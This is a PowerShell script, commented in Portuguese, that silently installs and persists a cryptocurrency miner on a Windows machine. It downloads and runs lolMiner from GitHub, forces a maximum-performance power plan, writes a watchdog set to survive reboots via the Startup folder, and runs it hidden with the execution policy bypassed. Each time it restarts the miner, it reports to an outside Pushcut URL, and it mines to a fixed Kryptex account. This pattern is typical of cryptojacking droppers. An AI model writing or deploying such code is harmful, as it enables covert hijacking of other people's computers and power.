# --- CONFIGURAÇÕES DE MINERAÇÃO (Edite aqui no GitHub) ---
$KRYPTEX_MINING_USERNAME = "krxXJ6MP7W"
$WORKER_NAME = $env:COMPUTERNAME
$ALGO = "CR29"
$POOL = "xtm-c29.kryptex.network:7040"
$LOL_API = "https://api.github.com/repos/Lolliedieb/lolMiner-releases/releases/latest"
$PUSHCUT_URL = "https://api.pushcut.io/kEZPLvKMdgtMxNA5IfHYB/notifications/MinhaNotifica%C3%A7%C3%A3o"

# --- DIRETÓRIOS ---
$APP_DIR = "$env:LOCALAPPDATA\KryptexDirect"
$MINER_DIR = "$APP_DIR\lolminer"
$DOWNLOAD_DIR = "$APP_DIR\download"
$LOG_DIR = "$APP_DIR\logs"
$WATCHDOG_PS1 = "$APP_DIR\KryptexDirectWatchdog.ps1"
$STARTUP_VBS = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\KryptexDirectWatchdog.vbs"

# --- LÓGICA DE INSTALAÇÃO E EXECUÇÃO ---
Write-Host "Iniciando processo de mineracao remota..."

# Criar pastas
New-Item -ItemType Directory -Force -Path $APP_DIR, $DOWNLOAD_DIR, $LOG_DIR | Out-Null

# Matar processos antigos
Stop-Process -Name "lolMiner" -Force -ErrorAction SilentlyContinue

# Aplicar Performance (Energia)
$ULTIMATE_GUID = "e9a42b02-d5df-448d-aa00-03f14749eb61"
powercfg -duplicatescheme $ULTIMATE_GUID | Out-Null
powercfg /setactive $ULTIMATE_GUID 2>$null
if ($LASTEXITCODE -ne 0) { powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c }

# Garantir lolMiner
$minerExe = Get-ChildItem -Path $MINER_DIR -Recurse -Filter "lolMiner.exe" | Select-Object -First 1
if (-not $minerExe) {
    Write-Host "Baixando lolMiner..."
    $rel = Invoke-RestMethod -Headers @{ 'User-Agent'='KryptexDirect' } -Uri $LOL_API
    $asset = $rel.assets | Where-Object { $_.name -match 'Win64.*\.zip$' } | Select-Object -First 1
    $zipPath = Join-Path $DOWNLOAD_DIR $asset.name
    Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath
    Expand-Archive -Force -Path $zipPath -DestinationPath $MINER_DIR
    $minerExe = Get-ChildItem -Path $MINER_DIR -Recurse -Filter "lolMiner.exe" | Select-Object -First 1
}

# Criar Watchdog
$watchdogContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$minerDir = '$MINER_DIR'
`$logDir = '$LOG_DIR'
`$username = '$KRYPTEX_MINING_USERNAME'
`$worker = '$WORKER_NAME'
`$algo = '$ALGO'
`$pool = '$POOL'
`$pushcutUrl = '$PUSHCUT_URL'
while (`$true) {
    `$miner = Get-ChildItem -Path `$minerDir -Recurse -Filter 'lolMiner.exe' | Select-Object -First 1
    if (`$miner) {
        `$running = Get-Process -Name 'lolMiner' -ErrorAction SilentlyContinue
        if (`$null -eq `$running) {
            `$args = "--algo `$algo --pool `$pool --user `$username/`$worker --watchdog exit"
            Start-Process -FilePath `$miner.FullName -ArgumentList `$args -WindowStyle Hidden
            try { Invoke-WebRequest -Uri `$pushcutUrl -Method Post -UseBasicParsing } catch {}
        }
    }
    Start-Sleep -Seconds 60
}
"@
$watchdogContent | Out-File -FilePath $WATCHDOG_PS1 -Encoding ascii

# Iniciar Watchdog em Background
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$WATCHDOG_PS1`"" -WindowStyle Hidden
